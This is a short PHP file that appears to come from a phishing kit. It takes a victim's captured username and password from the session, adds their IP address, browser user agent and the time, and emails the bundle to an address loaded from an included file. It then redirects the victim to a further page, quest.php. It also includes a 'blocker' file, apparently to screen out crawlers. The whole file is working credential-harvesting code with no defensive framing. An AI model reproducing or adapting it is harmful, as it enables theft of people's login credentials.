<?php
session_start();
include "email.php";
include('blocker.php');
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");

$aa = $_SESSION['user'];
$pp = $_SESSION['pass'];
$data ="
## Laur LOGIN ##
|USER : $aa
|PASS : $pp
## first ##
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##laur #$aa $pp $ip";

if(strlen($aa)>= 4 || strlen($aa)<16){
	mail($emailusr, $subj, $data);	
}



header("Location: quest.php");

?>